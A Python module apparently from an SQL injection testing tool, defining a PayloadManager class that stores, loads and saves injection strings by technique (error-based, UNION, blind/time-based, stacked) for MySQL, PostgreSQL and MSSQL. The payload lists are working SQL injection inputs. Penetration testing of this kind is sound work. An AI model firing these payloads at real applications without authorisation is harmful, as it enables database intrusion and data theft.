#!/usr/bin/env python3

from typing import Dict, List, Optional
import json
import os

class PayloadManager:
    def __init__(self, payload_file: Optional[str] = None):
        """
        Initialize the PayloadManager with optional custom payload file.
        
        Args:
            payload_file: Path to custom payload JSON file
        """
        self.payloads = {
            "error": {
                "mysql": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' OR '1'='1'--",
                    "' OR '1'='1'#",
                    "' OR 1=1#",
                    "' OR '1'='1'/*",
                    "' OR 1=1/*",
                    "' OR '1'='1'-- -",
                    "' OR 1=1-- -",
                    "' OR '1'='1'# -",
                    "' OR 1=1# -"
                ],
                "postgresql": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' OR '1'='1'--",
                    "' OR '1'='1'/*",
                    "' OR 1=1/*",
                    "' OR '1'='1'-- -",
                    "' OR 1=1-- -"
                ],
                "mssql": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' OR '1'='1'--",
                    "' OR '1'='1'/*",
                    "' OR 1=1/*",
                    "' OR '1'='1'-- -",
                    "' OR 1=1-- -"
                ]
            },
            "union": {
                "mysql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
                ],
                "postgresql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
                ],
                "mssql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
                ]
            },
            "blind": {
                "mysql": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' AND SLEEP(5)--",
                    "' AND BENCHMARK(10000000,MD5(1))--"
                ],
                "postgresql": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' AND pg_sleep(5)--"
                ],
                "mssql": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' AND WAITFOR DELAY '0:0:5'--"
                ]
            },
            "stacked": {
                "mysql": [
                    "'; SELECT 1--",
                    "'; SELECT 1,2--",
                    "'; SELECT 1,2,3--",
                    "'; SELECT 1,2,3,4--",
                    "'; SELECT 1,2,3,4,5--"
                ],
                "postgresql": [
                    "'; SELECT 1--",
                    "'; SELECT 1,2--",
                    "'; SELECT 1,2,3--",
                    "'; SELECT 1,2,3,4--",
                    "'; SELECT 1,2,3,4,5--"
                ],
                "mssql": [
                    "'; SELECT 1--",
                    "'; SELECT 1,2--",
                    "'; SELECT 1,2,3--",
                    "'; SELECT 1,2,3,4--",
                    "'; SELECT 1,2,3,4,5--"
                ]
            }
        }
        
        # Load custom payloads if provided
        if payload_file and os.path.exists(payload_file):
            self.load_custom_payloads(payload_file)
    
    def load_custom_payloads(self, payload_file: str) -> None:
        """
        Load custom payloads from a JSON file.
        
        Args:
            payload_file: Path to JSON file containing custom payloads
        """
        try:
            with open(payload_file, 'r') as f:
                custom_payloads = json.load(f)
                self.payloads.update(custom_payloads)
        except Exception as e:
            print(f"Error loading custom payloads: {str(e)}")
    
    def get_payloads(self, injection_type: str, db_type: Optional[str] = None) -> List[str]:
        """Get payloads for a specific injection type and database type."""
        if injection_type not in self.payloads:
            return []
        
        if db_type and db_type in self.payloads[injection_type]:
            return self.payloads[injection_type][db_type]
        
        # If no specific database type is provided, return all payloads for the injection type
        all_payloads = []
        for db_payloads in self.payloads[injection_type].values():
            all_payloads.extend(db_payloads)
        return all_payloads
    
    def add_payload(self, injection_type: str, payload: str, db_type: Optional[str] = None) -> None:
        """Add a new payload for a specific injection type and database type."""
        if injection_type not in self.payloads:
            self.payloads[injection_type] = {}
        
        if db_type:
            if db_type not in self.payloads[injection_type]:
                self.payloads[injection_type][db_type] = []
            self.payloads[injection_type][db_type].append(payload)
        else:
            # Add payload to all database types
            for db_type in self.payloads[injection_type]:
                self.payloads[injection_type][db_type].append(payload)
    
    def remove_payload(self, injection_type: str, payload: str, db_type: Optional[str] = None) -> None:
        """Remove a payload for a specific injection type and database type."""
        if injection_type not in self.payloads:
            return
        
        if db_type and db_type in self.payloads[injection_type]:
            if payload in self.payloads[injection_type][db_type]:
                self.payloads[injection_type][db_type].remove(payload)
        else:
            # Remove payload from all database types
            for db_type in self.payloads[injection_type]:
                if payload in self.payloads[injection_type][db_type]:
                    self.payloads[injection_type][db_type].remove(payload)
    
    def clear_payloads(self, injection_type: Optional[str] = None, db_type: Optional[str] = None) -> None:
        """Clear all payloads or payloads for a specific injection type and database type."""
        if injection_type:
            if db_type:
                if injection_type in self.payloads and db_type in self.payloads[injection_type]:
                    self.payloads[injection_type][db_type] = []
            else:
                if injection_type in self.payloads:
                    self.payloads[injection_type] = {}
        else:
            self.payloads = {}
    
    def save_payloads(self, output_file: str) -> None:
        """
        Save current payloads to a JSON file.
        
        Args:
            output_file: Path to output JSON file
        """
        try:
            with open(output_file, 'w') as f:
                json.dump(self.payloads, f, indent=4)
        except Exception as e:
            print(f"Error saving payloads: {str(e)}") 
